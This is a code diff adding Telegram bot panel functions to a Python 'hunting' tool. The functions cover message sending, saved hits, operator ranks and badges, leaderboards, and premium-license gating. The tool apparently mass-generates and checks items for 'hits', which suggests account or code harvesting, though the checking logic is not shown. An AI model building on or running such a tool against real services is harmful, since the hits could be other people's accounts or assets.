+    """Slash commands always send a new Telegram message (never edit an old panel)."""
+    if not TELEGRAM_ENABLED:
+        return None
+    if chat_id is None:
+        chat_id = operator_reply_chat_id()
+    target = str(chat_id or TELEGRAM_CHAT_ID or "").strip()
+    if not target:
+        return None
+    markup = {"inline_keyboard": []} if remove_markup else reply_markup
+    payload = {
+        "chat_id": target,
+        "text": text,
+        "parse_mode": "HTML",
+    }
+    if markup is not None:
+        payload["reply_markup"] = markup
+    resp = telegram_post_with_retries(
+        "sendMessage",
+        payload,
+        timeout=TG_SEND_TIMEOUT,
+        max_retries=TG_BOT_CMD_MAX_RETRIES,
+        label="TG BOT",
+    )
+    actor = getattr(_operator_cmd_ctx, "actor_id", None)
+    if _track_operator_cmd_panel(chat_id, actor):
+        remember_cmd_panel(response=resp)
+        _sync_live_panel_from_reply_markup(reply_markup)
+    return resp
+
+
+HIT_GROUP_GROUP_COMMANDS = frozenset({
+    "/hitgroup", "hitgroup", "/setgroup", "setgroup",
+    "/verifyhitgroup", "verifyhitgroup",
+})
+
+
+def is_hit_group_command(text):
+    head = _telegram_command_head(text)
+    return head in HIT_GROUP_GROUP_COMMANDS or (text or "").strip().lower() in HIT_GROUP_GROUP_COMMANDS
+
+
+def _telegram_command_head(text):
+    raw = (text or "").strip().lower()
+    if not raw:
+        return ""
+    token = raw.split()[0]
+    if token.startswith("/"):
+        return token.split("@")[0]
+    return token
+
+
+def is_hit_group_group_command(text):
+    return is_hit_group_command(text)
+
+
+def send_telegram_document(filepath, caption=None):
+    if not TELEGRAM_ENABLED or not os.path.exists(filepath):
+        return None
+    try:
+        with open(filepath, "rb") as doc:
+            data = {"chat_id": TELEGRAM_CHAT_ID}
+            if caption:
+                data["caption"] = caption
+                data["parse_mode"] = "HTML"
+            return send_telegram_request(
+                "sendDocument",
+                data=data,
+                files={"document": (os.path.basename(filepath), doc)},
+            )
+    except Exception as exc:
+        log_event("TG ERR", str(exc)[:120])
+        return None
+
+
+TG_CAPTION_LIMIT = 1024
+
+
+def _telegram_api_ok(response):
+    if response is None:
+        return False
+    if response.ok:
+        return True
+    try:
+        desc = response.json().get("description", "").lower()
+        if "message is not modified" in desc:
+            return True
+    except Exception:
+        pass
+    return False
+
+
+def panel_message_from_callback(callback):
+    msg = callback.get("message") or {}
+    chat = msg.get("chat") or {}
+    return str(chat.get("id", "")), msg.get("message_id"), msg
+
+
+def edit_telegram_message(chat_id, message_id, text, reply_markup=None, parse_mode="HTML"):
+    payload = {
+        "chat_id": chat_id,
+        "message_id": message_id,
+        "text": text,
+        "parse_mode": parse_mode,
+    }
+    if reply_markup is not None:
+        payload["reply_markup"] = reply_markup
+    return send_telegram_request("editMessageText", data=payload)
+
+
+def edit_telegram_caption(chat_id, message_id, caption, reply_markup=None, parse_mode="HTML"):
+    payload = {
+        "chat_id": chat_id,
+        "message_id": message_id,
+        "caption": caption,
+        "parse_mode": parse_mode,
+    }
+    if reply_markup is not None:
+        payload["reply_markup"] = reply_markup
+    return send_telegram_request("editMessageCaption", data=payload)
+
+
+def delete_telegram_message(chat_id, message_id):
+    return send_telegram_request("deleteMessage", data={
+        "chat_id": chat_id,
+        "message_id": message_id,
+    })
+
+
+def update_panel_message(chat_id, message_id, text, reply_markup=None, source_message=None):
+    """Edit the callback's message in place; fall back to send/delete if needed."""
+    if not chat_id or not message_id:
+        return send_telegram_text(text, reply_markup=reply_markup)
+
+    is_photo = bool(source_message and source_message.get("photo"))
+    if is_photo:
+        if len(text) <= TG_CAPTION_LIMIT:
+            response = edit_telegram_caption(chat_id, message_id, text, reply_markup=reply_markup)
+            if _telegram_api_ok(response):
+                return response
+        delete_telegram_message(chat_id, message_id)
+        return send_telegram_text(text, reply_markup=reply_markup)
+
+    response = edit_telegram_message(chat_id, message_id, text, reply_markup=reply_markup)
+    if _telegram_api_ok(response):
+        return response
+    return send_telegram_text(text, reply_markup=reply_markup)
+
+
+def edit_panel_from_callback(
+    callback, text, reply_markup=None, toast="Updated", show_alert=False,
+):
+    callback_id = callback.get("id")
+    chat_id, message_id, msg = panel_message_from_callback(callback)
+    if chat_id and str(chat_id) != TELEGRAM_CHAT_ID:
+        return None
+    answer_callback(callback_id, toast, show_alert=show_alert)
+    resp = update_panel_message(chat_id, message_id, text, reply_markup, msg)
+    remember_cmd_panel(chat_id, message_id)
+    _sync_live_panel_from_reply_markup(reply_markup)
+    return resp
+
+
+def get_last_hits(limit=3):
+    if not os.path.exists("hits.txt"):
+        return "No saved hits available."
+    with open("hits.txt", "r", encoding="utf-8", errors="ignore") as file:
+        raw = file.read().strip()
+    if not raw:
+        return "No saved hits available."
+
+    blocks = [block.strip() for block in raw.split("╚" + "═" * 60 + "╝") if block.strip()]
+    recent = blocks[-limit:]
+    if not recent:
+        return "No saved hits available."
+    formatted = []
+    for block in recent:
+        formatted.append(block + "\n╚" + "═" * 60 + "╝")
+    return "\n\n".join(formatted)
+
+
+def cloud_unavailable_message():
+    return (
+        format_panel_header()
+        + "<b>Cloud sync required</b>\n\n"
+        + "Set <code>SUPABASE_URL</code> and\n"
+        + "<code>SUPABASE_ANON_KEY</code> at the top of joint.py,\n"
+        + "then restart and link this device."
+    )
+
+
+def default_profile():
+    oid = resolve_operator_id(TELEGRAM_CHAT_ID) or "unknown"
+    now = datetime.now(timezone.utc).isoformat()
+    info = fetch_telegram_user(oid) if oid != "unknown" else None
+    display_name = (info or {}).get("display_name") or f"User {oid[-6:]}"
+    return {
+        "operator_id": oid,
+        "display_name": display_name,
+        "first_seen": now,
+        "last_active": now,
+        "last_active_date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
+        "streak_days": 1,
+        "achievements": [],
+        "favorites": [],
+        "favorite_notes": {},
+        "lifetime": {
+            "sessions_completed": 0,
+            "total_hits": 0,
+            "total_generated": 0,
+            "total_runtime_sec": 0,
+            "best_session_hits": 0,
+            "best_hit_rate": 0.0,
+            "best_hits_per_hour": 0.0,
+            "best_hit_quality": 0,
+            "quality_hits_3plus": 0,
+            "quality_hits_4plus": 0,
+            "quality_hits_5": 0,
+        },
+    }
+
+
+def load_profile_data():
+    oid = resolve_operator_id(TELEGRAM_CHAT_ID)
+    cache = load_profile_cache(oid)
+    if not is_cloud_enabled():
+        profile = default_profile()
+        profile["operator_id"] = oid
+        profile = merge_profile_records(profile, cache)
+        profile["favorite_notes"] = load_local_favorite_notes()
+        return profile
+    profile, err = fetch_profile(oid)
+    if err:
+        log_event("CLOUD", err)
+    if profile:
+        profile = merge_profile_records(profile, cache)
+        local_notes = load_local_favorite_notes()
+        if local_notes:
+            notes = dict(local_notes)
+            notes.update(profile.get("favorite_notes") or {})
+            profile["favorite_notes"] = notes
+        if cache.get("last_milestone_hit"):
+            profile["last_milestone_hit"] = cache["last_milestone_hit"]
+        return profile
+    profile = default_profile()
+    profile["operator_id"] = oid
+    profile = merge_profile_records(profile, cache)
+    profile["favorite_notes"] = load_local_favorite_notes()
+    return profile
+
+
+def save_profile_data(data):
+    global last_milestone_hit
+    oid = str((data or {}).get("operator_id") or resolve_operator_id(TELEGRAM_CHAT_ID) or "").strip()
+    if oid:
+        data["operator_id"] = oid
+    cache = load_profile_cache(oid) if oid else {}
+    data = merge_profile_records(data, cache)
+    if is_cloud_enabled() and oid:
+        cloud_row, err = fetch_profile(oid)
+        if err:
+            log_event("CLOUD", err)
+        if cloud_row:
+            data = merge_profile_records(data, cloud_row)
+    data["last_milestone_hit"] = max(
+        int(data.get("last_milestone_hit") or 0), int(last_milestone_hit or 0)
+    )
+    save_profile_cache(data)
+    if not is_cloud_enabled():
+        return
+    saved, err = upsert_profile(data)
+    if err:
+        log_event("CLOUD", err)
+        return
+    if saved:
+        data = merge_profile_records(data, saved)
+        save_profile_cache(data)
+
+
+def get_operator_rank(lifetime_hits):
+    if lifetime_hits >= 5000:
+        return "Mythic", "★★"
+    if lifetime_hits >= 1000:
+        return "Warlord", "◆◆"
+    if lifetime_hits >= 250:
+        return "Apex Hunter", "▣▣"
+    return "Rookie", "○"
+
+
+def record_session_hit_timestamp():
+    now = time.time()
+    with lock:
+        _session_hit_times.append(now)
+        cutoff = now - SESSION_HIT_WINDOW_SEC
+        while _session_hit_times and _session_hit_times[0] < cutoff:
+            _session_hit_times.pop(0)
+
+
+def session_hits_in_window(window_sec=SESSION_HIT_WINDOW_SEC):
+    now = time.time()
+    cutoff = now - window_sec
+    with lock:
+        while _session_hit_times and _session_hit_times[0] < cutoff:
+            _session_hit_times.pop(0)
+        return len(_session_hit_times)
+
+
+def clear_session_hit_timestamps():
+    with lock:
+        _session_hit_times.clear()
+
+
+def current_session_snapshot():
+    elapsed = (datetime.now(timezone.utc) - START_TIME).total_seconds()
+    with lock:
+        generated = gen
+        valid_count = valid
+        hits_count = hit
+        error_count = errors
+    hit_rate = (hits_count / generated * 100) if generated else 0.0
+    hits_last_60m = session_hits_in_window(SESSION_HIT_WINDOW_SEC)
+    return {
+        "started": START_TIME.isoformat(),
+        "ended": datetime.now(timezone.utc).isoformat(),
+        "generated": generated,
+        "valid": valid_count,
+        "hits": hits_count,
+        "errors": error_count,
+        "duration_sec": int(elapsed),
+        "hit_rate": round(hit_rate, 2),
+        "hits_last_60m": hits_last_60m,
+    }
+
+
+def profile_touch_activity(profile=None):
+    now = datetime.now(timezone.utc)
+    today = now.strftime("%Y-%m-%d")
+
+    def _apply(data):
+        last_date = data.get("last_active_date", today)
+        if last_date == today:
+            pass
+        else:
+            try:
+                last_dt = datetime.strptime(last_date, "%Y-%m-%d").date()
+                if (now.date() - last_dt).days == 1:
+                    data["streak_days"] = data.get("streak_days", 0) + 1
+                else:
+                    data["streak_days"] = 1
+            except Exception:
+                data["streak_days"] = 1
+        data["last_active"] = now.isoformat()
+        data["last_active_date"] = today
+        return data
+
+    if profile is not None:
+        return _apply(profile)
+    with profile_lock:
+        data = load_profile_data()
+        save_profile_data(_apply(data))
+
+
+def profile_init_on_startup():
+    global last_milestone_hit
+    if not is_device_ready():
+        return
+    with profile_lock:
+        profile = load_profile_data()
+        oid = resolve_operator_id(TELEGRAM_CHAT_ID)
+        profile["operator_id"] = oid
+        if is_device_style_name(profile.get("display_name")):
+            info = fetch_telegram_user(oid)
+            if info:
+                profile["display_name"] = info["display_name"]
+        if not profile.get("first_seen"):
+            profile["first_seen"] = datetime.now(timezone.utc).isoformat()
+        profile = profile_touch_activity(profile)
+        save_profile_data(profile)
+        last_milestone_hit = max(
+            int(last_milestone_hit or 0),
+            int(profile.get("last_milestone_hit") or 0),
+            int(load_profile_cache(oid).get("last_milestone_hit") or 0),
+        )
+
+
+def profile_eval_achievements(profile, snap):
+    unlocked = set(_normalize_achievements(profile.get("achievements")))
+    new_unlocks = []
+    lifetime_hits = profile["lifetime"]["total_hits"]
+    life = profile["lifetime"]
+    checks = [
+        ("first_hit", lifetime_hits >= 1),
+        ("hits_10", lifetime_hits >= 250),
+        ("hits_50", lifetime_hits >= 1000),
+        ("hits_100", lifetime_hits >= 5000),
+        ("session_10", snap["hits"] >= 75),
+        ("session_25", snap["hits"] >= 150),
+        ("speed_20", snap["hits_last_60m"] >= 50),
+        ("gen_1k", snap["generated"] >= 25000),
+        ("clean_5", snap["hits"] >= 25 and snap["errors"] == 0),
+        ("streak_3", profile.get("streak_days", 0) >= 14),
+        ("streak_7", profile.get("streak_days", 0) >= 30),
+        ("quality_3", life.get("quality_hits_3plus", 0) >= 75),
+        ("quality_4", life.get("quality_hits_4plus", 0) >= 40),
+        ("quality_5", life.get("quality_hits_5", 0) >= 15),
+        ("quality_5_x5", life.get("quality_hits_5", 0) >= 50),
+        ("quality_5_x10", life.get("quality_hits_5", 0) >= 150),
+    ]
+    for ach_id, ok in checks:
+        if ok and ach_id not in unlocked:
+            unlocked.add(ach_id)
+            new_unlocks.append(ach_id)
+    profile["achievements"] = sorted(unlocked)
+    return new_unlocks
+
+
+def profile_update_lifetime_peaks(profile, snap):
+    life = profile["lifetime"]
+    life["best_session_hits"] = max(life.get("best_session_hits", 0), snap["hits"])
+    life["best_hit_rate"] = max(life.get("best_hit_rate", 0.0), snap["hit_rate"])
+    burst = snap.get("hits_last_60m", 0)
+    life["best_hits_per_hour"] = max(life.get("best_hits_per_hour", 0), burst)
+
+
+def notify_achievement_unlock(ach_id):
+    if ach_id not in ACHIEVEMENTS or not TELEGRAM_ENABLED:
+        return
+    name, desc, sym = ACHIEVEMENTS[ach_id]
+    send_telegram_text(
+        format_panel_header()
+        + f"<b>{sym} Badge unlocked</b>\n\n"
+        + tg_row("Title", name)
+        + tg_row("Detail", desc),
+    )
+
+
+def _apply_hit_quality_to_lifetime(life, quality_stars):
+    qs = max(1, min(5, int(quality_stars or 1)))
+    life["best_hit_quality"] = max(life.get("best_hit_quality", 0), qs)
+    if qs >= 3:
+        life["quality_hits_3plus"] = life.get("quality_hits_3plus", 0) + 1
+    if qs >= 4:
+        life["quality_hits_4plus"] = life.get("quality_hits_4plus", 0) + 1
+    if qs >= 5:
+        life["quality_hits_5"] = life.get("quality_hits_5", 0) + 1
+    return qs
+
+
+def profile_record_hit(*, quality_stars=None):
+    """Record a lifetime hit. Quality is applied separately after enrich when possible."""
+    if not is_profile_tracking_ready():
+        return
+    record_session_hit_timestamp()
+    snap = current_session_snapshot()
+    new_unlocks = []
+    with profile_lock:
+        profile = load_profile_data()
+        life = profile["lifetime"]
+        life["total_hits"] = life.get("total_hits", 0) + 1
+        if quality_stars is not None:
+            _apply_hit_quality_to_lifetime(life, quality_stars)
+        profile_update_lifetime_peaks(profile, snap)
+        profile = profile_touch_activity(profile)
+        new_unlocks = profile_eval_achievements(profile, snap)
+        save_profile_data(profile)
+    for ach_id in new_unlocks:
+        notify_achievement_unlock(ach_id)
+
+
+def profile_record_hit_quality(quality_stars):
+    """Apply final hit quality after async enrich (or instant path without Telegram)."""
+    if not is_profile_tracking_ready() or quality_stars is None:
+        return
+    snap = current_session_snapshot()
+    new_unlocks = []
+    with profile_lock:
+        profile = load_profile_data()
+        _apply_hit_quality_to_lifetime(profile["lifetime"], quality_stars)
+        profile_update_lifetime_peaks(profile, snap)
+        profile = profile_touch_activity(profile)
+        new_unlocks = profile_eval_achievements(profile, snap)
+        save_profile_data(profile)
+    for ach_id in new_unlocks:
+        notify_achievement_unlock(ach_id)
+
+
+def profile_archive_session():
+    if not is_device_ready():
+        return
+    snap = current_session_snapshot()
+    if snap["generated"] == 0 and snap["hits"] == 0:
+        return
+    oid = resolve_operator_id(TELEGRAM_CHAT_ID)
+    err = insert_session(oid, snap)
+    if err:
+        log_event("CLOUD", err)
+    with profile_lock:
+        profile = load_profile_data()
+        life = profile["lifetime"]
+        life["sessions_completed"] = life.get("sessions_completed", 0) + 1
+        life["total_generated"] = life.get("total_generated", 0) + snap["generated"]
+        life["total_runtime_sec"] = life.get("total_runtime_sec", 0) + snap["duration_sec"]
+        profile_update_lifetime_peaks(profile, snap)
+        profile = profile_touch_activity(profile)
+        new_unlocks = profile_eval_achievements(profile, snap)
+        save_profile_data(profile)
+    for ach_id in new_unlocks:
+        notify_achievement_unlock(ach_id)
+
+
+def format_profile():
+    if not is_device_ready():
+        return cloud_unavailable_message()
+    with profile_lock:
+        profile = load_profile_data()
+    snap = current_session_snapshot()
+    life = profile["lifetime"]
+    rank, rank_sym = get_operator_rank(life.get("total_hits", 0))
+    badge_count = len(profile.get("achievements", []))
+    total_badges = len(ACHIEVEMENTS)
+    first_seen = profile.get("first_seen", "")[:10]
+    streak = profile.get("streak_days", 1)
+    oid = resolve_operator_id(TELEGRAM_CHAT_ID)
+    global_rank, rank_err = fetch_operator_rank(oid)
+    rank_line = f"#{global_rank} global" if global_rank and not rank_err else "—"
+
+    vs_best = ""
+    if life.get("best_session_hits", 0) > 0:
+        diff = snap["hits"] - life["best_session_hits"]
+        if diff >= 0:
+            vs_best = f"+{diff} vs record"
+        else:
+            vs_best = f"{diff} vs record"
+
+    return (
+        format_panel_header()
+        + f"<b>{S['btn_user']} Operator Profile</b>\n\n"
+        + tg_row("Operator", telegram_profile_link_html(oid, profile.get("display_name")))
+        + tg_row("Rank", f"{rank_sym} {rank}")
+        + tg_row("Global", rank_line)
+        + tg_row("Member since", first_seen)
+        + tg_row("Active streak", f"{streak} day(s)")
+        + tg_section("LIFETIME")
+        + tg_row("Sessions", str(life.get("sessions_completed", 0)))
+        + tg_row("Total hits", f"{life.get('total_hits', 0):,}")
+        + tg_row("Total checks", f"{life.get('total_generated', 0):,}")
+        + tg_row("Runtime", format_duration(life.get("total_runtime_sec", 0)))
+        + tg_row("Best session", str(life.get("best_session_hits", 0)))
+        + tg_row("Best hit rate", f"{life.get('best_hit_rate', 0):.2f}%")
+        + tg_row("Best 60m burst", str(int(life.get("best_hits_per_hour", 0))))
+        + tg_section("CURRENT SESSION")
+        + tg_row("Hits", str(snap["hits"]))
+        + tg_row("Checks", f"{snap['generated']:,}")
+        + tg_row("Hit rate", f"{snap['hit_rate']:.2f}%")
+        + tg_row("Hits (60m)", str(snap.get("hits_last_60m", 0)))
+        + tg_row("Vs best", vs_best or "—")
+        + tg_section("BADGES")
+        + tg_row("Unlocked", f"{badge_count}/{total_badges}")
+        + tg_section("FAVORITES")
+        + tg_row("Saved", str(len(profile.get("favorites") or [])))
+        + f"\n<i>Send <code>/saved</code> for <code>favorites.txt</code></i>\n"
+    )
+
+
+def format_operator_leaderboard():
+    if not is_device_ready():
+        return cloud_unavailable_message()
+    entries, err = fetch_operator_leaderboard(10)
+    lines = [
+        format_panel_header(),
+        f"<b>{S['btn_rank']} Global Operators</b>\n",
+        "<i>All clients · ranked by lifetime hits</i>\n",
+    ]
+    if err:
+        lines.append(f"<i>Cloud error: {html.escape(err)}</i>")
+        return "".join(lines)
+    if not entries:
+        lines.append("<i>No operators on the board yet.</i>")
+        return "".join(lines)
+    medals = ("I", "II", "III", "IV", "V", "VI", "VII", "VIII", "IX", "X")
+    me = resolve_operator_id(TELEGRAM_CHAT_ID)
+    for idx, row in enumerate(entries):
+        medal = medals[idx] if idx < len(medals) else str(idx + 1)
+        op_id = row.get("id") or ""
+        name_link = telegram_profile_link_html(op_id, row.get("display_name"))
+        hits = row.get("lifetime_hits") or 0
+        best = row.get("best_session_hits") or 0
+        tag = " · you" if op_id == me else ""
+        lines.append(
+            f"  <code>{medal}</code>  {name_link}  "
+            f"<code>{hits:,}</code> hits  best <code>{best}</code>{tag}\n"
+        )
+        schedule_operator_name_sync(op_id)
+    return "".join(lines)
+
+
+def format_session_leaderboard(scope="all"):
+    if not is_device_ready():
+        return cloud_unavailable_message()
+    scope_label = {"day": "Today", "week": "This week", "all": "All time"}.get(scope, "All time")
+    entries, err = fetch_session_leaderboard(scope, 10)
+    lines = [
+        format_panel_header(),
+        f"<b>{S['btn_rank']} Global Sessions</b>\n",
+        f"<i>{scope_label} · best runs worldwide</i>\n",
+    ]
+    if err:
+        lines.append(f"<i>Cloud error: {html.escape(err)}</i>")
+        return "".join(lines)
+    if not entries:
+        lines.append("<i>No ranked sessions yet.</i>")
+        return "".join(lines)
+    medals = ("I", "II", "III", "IV", "V", "VI", "VII", "VIII", "IX", "X")
+    me = resolve_operator_id(TELEGRAM_CHAT_ID)
+    snap = current_session_snapshot()
+    for idx, entry in enumerate(entries):
+        medal = medals[idx] if idx < len(medals) else str(idx + 1)
+        hits = entry.get("hits") or 0
+        rate = float(entry.get("hit_rate") or 0)
+        dur = format_duration(entry.get("duration_sec") or 0)
+        op = entry.get("operator_id") or "?"
+        op_link = telegram_profile_link_html(op)
+        tag = " · you" if op == me else ""
+        try:
+            when = datetime.fromisoformat(entry.get("ended_at", "")).strftime("%d %b %H:%M")
+        except Exception:
+            when = "—"
+        lines.append(
+            f"  <code>{medal}</code>  {op_link}  <b>{hits}</b> hits  "
+            f"<code>{rate:.1f}%</code>  <code>{dur}</code>  "
+            f"<i>{when}{tag}</i>\n"
+        )
+    if snap["hits"] > 0:
+        lines.append(
+            f"\n<i>{S['bullet']} Your live session: {snap['hits']} hits</i>"
+        )
+    return "".join(lines)
+
+
+def format_leaderboard(scope="all"):
+    global LEADERBOARD_MODE
+    if LEADERBOARD_MODE == "operators":
+        return format_operator_leaderboard()
+    return format_session_leaderboard(scope)
+
+
+def format_badges():
+    if not is_device_ready():
+        return cloud_unavailable_message()
+    with profile_lock:
+        profile = load_profile_data()
+    unlocked = set(profile.get("achievements", []))
+    lines = [format_panel_header(), f"<b>{S['btn_badge']} Badge Collection</b>\n"]
+
+    for ach_id, (name, desc, sym) in ACHIEVEMENTS.items():
+        if ach_id in unlocked:
+            lines.append(f"  {sym}  <b>{html.escape(name)}</b>  <code>unlocked</code>\n")
+            lines.append(f"      <i>{html.escape(desc)}</i>\n")
+        else:
+            lines.append(f"  ○  <code>locked</code>  <i>{html.escape(desc)}</i>\n")
+    lines.append(tg_row("Progress", f"{len(unlocked)}/{len(ACHIEVEMENTS)}"))
+    return "".join(lines)
+
+
+def set_paused(value, *, remote=True):
+    global _user_manual_paused
+    if remote:
+        _user_manual_paused = value
+    if not value:
+        _clear_hunt_ip_change_pause()
+    apply_worker_pause_state()
+    if remote:
+        if value:
+            log_event("PAUSE", "Paused remotely")
+        elif paused:
+            log_event("RESUME", "Still paused (API offline or access gate)")
+        else:
+            log_event("RESUME", "Hunt resumed remotely")
+    elif value:
+        log_event("PAUSE", "Paused")
+    elif not paused:
+        log_event("RESUME", "Resumed")
+
+
+def sync_operator_access():
+    global ACCESS_BLOCKED, _access_trust_ok_at
+    if is_locally_logged_out():
+        ACCESS_BLOCKED = True
+        return False
+    if not TELEGRAM_ENABLED:
+        ACCESS_BLOCKED = False
+        return True
+    user_id = resolve_operator_telegram_id()
+    if user_id and operator_ban_active(user_id, force=False):
+        ACCESS_BLOCKED = True
+        return False
+    ok = admin_sync_terminal_access()
+    if ok:
+        _access_trust_ok_at = time.time()
+        ACCESS_BLOCKED = False
+        return True
+    if _operator_hunt_trusted() or _access_trust_grace_active():
+        ACCESS_BLOCKED = False
+        return True
+    ACCESS_BLOCKED = True
+    return False
+
+
+def hunting_license_ok(user_id=None):
+    """Active plan required before hunt workers run (Free trial or Premium)."""
+    if is_locally_logged_out():
+        return False
+    if not TELEGRAM_ENABLED:
+        return True
+    user_id = str(user_id or resolve_operator_telegram_id() or "").strip()
+    if not user_id:
+        return False
+    if admin_is_admin(user_id):
+        return True
+    if operator_ban_active(user_id, force=False):
+        return False
+    ok, _, _ = plan_can_hunt(user_id)
+    return bool(ok)
+
+
+def hunting_license_ok_cached(user_id=None):
+    """Cached license gate for worker/panel hot paths — avoids registry lock every loop."""
+    if is_locally_logged_out():
+        return False
+    if not TELEGRAM_ENABLED:
+        return True
+    user_id = str(user_id or resolve_operator_telegram_id() or "").strip()
+    if not user_id:
+        return False
+    if admin_is_admin(user_id):
+        return True
+    if _dashboard_local_premium_snap(user_id):
+        return True
+    now = time.time()
+    if (
+        _hunt_license_cache.get("ok") is not None
+        and now - float(_hunt_license_cache.get("at") or 0) < HUNT_LICENSE_CACHE_TTL
+    ):
+        return bool(_hunt_license_cache["ok"])
+    ok = hunting_license_ok(user_id)
+    _hunt_license_cache.update(ok=ok, at=now)
+    return ok
+
+
+def _worker_api_ok():
+    if _hunt_active_session():
+        return True
+    return get_api_alive_cached() or _hunt_recently_ok()
+
+
+def operator_access_ok(*, force=False, actor_id=None):
+    if is_locally_logged_out():
+        return False
+    if not TELEGRAM_ENABLED:
+        return True
+    actor_id = str(actor_id or "").strip()
+    if actor_id and admin_is_admin(actor_id):
+        return True
+    user_id = resolve_operator_telegram_id()
+    if not user_id:
+        return False
+    if operator_ban_active(user_id, force=force):
+        _operator_gate_cache.update(user_id=user_id, ok=False, at=time.time())
+        return False
+    if not force and operator_access_sticky_active():
+        return True
+    if not force and _access_trust_grace_active() and read_operator_session_verified(user_id):
+        return True
+    if JACK_PANEL_LIVE and not force and read_operator_session_verified(user_id):
+        return True
+    if not force and read_operator_session_verified(user_id) and _dashboard_local_premium_snap(user_id):
+        return True
+    if not hunting_license_ok(user_id):
+        if not force and read_operator_session_verified(user_id) and _operator_hunt_trusted():
+            return True
+        return False
+    if not force and read_operator_session_verified(user_id):
+        if operator_terminal_ready_local(fast=True):
+            mark_operator_access_verified()
+            return True
+    if not force and operator_access_sticky_active():
+        return True
+    now = time.time()
+    if (
+        not force
+        and _operator_gate_cache["user_id"] == user_id
+        and _operator_gate_cache["ok"] is not None
+        and now - _operator_gate_cache["at"] < OPERATOR_GATE_TTL
+    ):
+        return bool(_operator_gate_cache["ok"])
+    if not force:
+        if (
+            _admin_access_cache["user_id"] == user_id
+            and _admin_access_cache["ok"]
+            and now - _admin_access_cache["at"] < ADMIN_ACCESS_TTL
+        ):
+            hg_ok, _ = operator_hit_group_access_state(force=False)
+            return hg_ok
+        return False
+    granted, _ = admin_user_access_granted(user_id)
+    if not granted:
+        _operator_gate_cache.update(user_id=user_id, ok=False, at=now)
+        return False
+    hg_ok, _ = operator_hit_group_access_state(force=force)
+    if hg_ok:
+        mark_operator_access_verified()
+    _operator_gate_cache.update(user_id=user_id, ok=hg_ok, at=now)
+    return hg_ok
+
+
+def telegram_actor_id(update):
+    if "message" in update:
+        return str(update["message"].get("from", {}).get("id", ""))
+    if "callback_query" in update:
+        return str(update["callback_query"].get("from", {}).get("id", ""))
+    return ""
+
+
+def operator_bot_commands_allowed(actor_id=None):
+    """Bot slash commands — allow when cached/full access OR valid license for actor."""
+    actor_id = str(actor_id or "").strip()
+    if operator_access_ok(force=False, actor_id=actor_id):
+        return True
+    if is_linked_operator(actor_id) and _operator_hunt_trusted():
+        return True
+    if not is_linked_operator(actor_id) and not admin_is_admin(actor_id):
+        return False
+    check_id = actor_id or resolve_operator_telegram_id()
+    entitled, _, _ = operator_plan_entitled(check_id)
+    return bool(entitled)
+
+
+def reply_hit_group_required(actor_id=None):
+    """None if hit group OK; else Telegram message with setup keyboard."""
+    sync_local_hit_group_from_cloud()
+    gid = read_local_hit_group_id()
+    if gid:
+        hg_ok, reason = operator_hit_group_access_state(force=False)
+        if hg_ok:
+            return None
+        hg_ok, reason = operator_hit_group_access_state(force=True)
+        if hg_ok:
+            return None
+        text = format_hit_group_gate_message(reason or "not_admin")
+        kb = hit_group_gate_keyboard()
+        return send_hit_group_gate_reply(text, reply_markup=kb, force=True)
+    reconcile_operator_hit_group()
+    gid = read_local_hit_group_id()
+    if gid:
+        hg_ok, reason = operator_hit_group_access_state(force=True)
+        if hg_ok:
+            return None
+        text = format_hit_group_gate_message(reason or "not_admin")
+        kb = hit_group_gate_keyboard()
+        return send_hit_group_gate_reply(text, reply_markup=kb, force=True)
+    hg_ok, reason = operator_hit_group_access_state(force=True)
+    if hg_ok:
+        return None
+    text = format_hit_group_gate_message(reason or "no_hit_group")
+    kb = hit_group_gate_keyboard()
+    return send_hit_group_gate_reply(text, reply_markup=kb, force=True)
+
+
+def send_access_gate_reply():
+    user_id = resolve_operator_id(TELEGRAM_CHAT_ID)
+    text, kb = admin_gate_reply_for_user(user_id)
+    if not text:
+        return True
+    safe_kb = sanitize_inline_keyboard_urls(kb) if kb else None
+    if _is_hit_group_gate_text(text):
+        return send_hit_group_gate_reply(text, reply_markup=safe_kb)
+    resp = bot_command_reply(text, reply_markup=safe_kb)
+    if resp is None and safe_kb:
+        verify_only = {
+            "inline_keyboard": [
+                [{"text": "✓ I joined — verify access", "callback_data": "VERIFY_JOIN"}]
+            ]
+        }
+        extra = "\n\n<i>Join links are in the message above — invalid invite URLs were skipped.</i>"
+        resp = bot_command_reply(text + extra, reply_markup=verify_only)
+    if resp is None:
+        resp = bot_command_reply(text)
+    return resp
+
+
+def format_pause_resume_confirm(resuming):
+    uptime = format_duration((datetime.now(timezone.utc) - START_TIME).total_seconds())
+    tp = get_throughput_metrics()
+    with lock:
+        hits_count = hit
+        generated = gen
+    if resuming:
+        if is_locally_logged_out():
+            title = "Still Paused"
+            tag = "WARN"
+            detail = "Logged out on this device — link your bot again to resume hunting."
+        elif _api_auto_paused:
+            title = "Still Paused"
+            tag = "WARN"
+            detail = (
+                "API endpoint offline — hunt stays auto-paused.\n"
+                f"<i>Start <code>python endpoint.py</code> on this PC, then Resume.</i>"
+            )
+        elif TELEGRAM_ENABLED and not hunting_license_ok():
+            title = "Still Paused"
+            tag = "WARN"
+            _, plan_reason, plan_info = plan_can_hunt()
+            if plan_reason == "daily_limit":
+                detail = (
+                    f"Free daily limit reached ({FREE_DAILY_GEN_LIMIT:,}/day).\n"
+                    "<b>Switch to INPARETO Premium</b> to continue — "
+                    f"{tg_code('/redeem INPA-XXXX-XXXX-XXXX-XXXX')}"
+                )
+            elif plan_reason == "trial_expired":
+                detail = (
+                    f"Your {FREE_TRIAL_DAYS}-day free trial ended.\n"
+                    f"Redeem Premium with {tg_code('/redeem INPA-…')} or contact support."
+                )
+            else:
+                detail = (
+                    "Plan inactive — check "
+                    f"{tg_code('/plan')} or redeem Premium with "
+                    f"{tg_code('/redeem INPA-XXXX-XXXX-XXXX-XXXX')}."
+                )
+        elif TELEGRAM_ENABLED and not operator_access_ok(force=True):
+            title = "Still Paused"
+            tag = "WARN"
+            detail = "Complete channel joins and hit group setup, then tap Resume again."
+        elif not pause_event.is_set():
+            title = "Still Paused"
+            tag = "WARN"
+            detail = "Workers are on standby — access gate or API is blocking the hunt."
+        else:
+            title = "Hunt Resumed"
+            tag = "RESUME"
+            detail = (
+                f"Workers online · session uptime <code>{uptime}</code>\n"
+                f"Hits this session <code>{hits_count:,}</code> · "
+                f"generated <code>{generated:,}</code>\n"
+                f"Throughput <code>{tp['hits_per_hr']:.1f}</code> hits/hr"
+            )
+    else:
+        paused_for = ""
+        if PAUSED_SINCE:
+            secs = (datetime.now(timezone.utc) - PAUSED_SINCE).total_seconds()
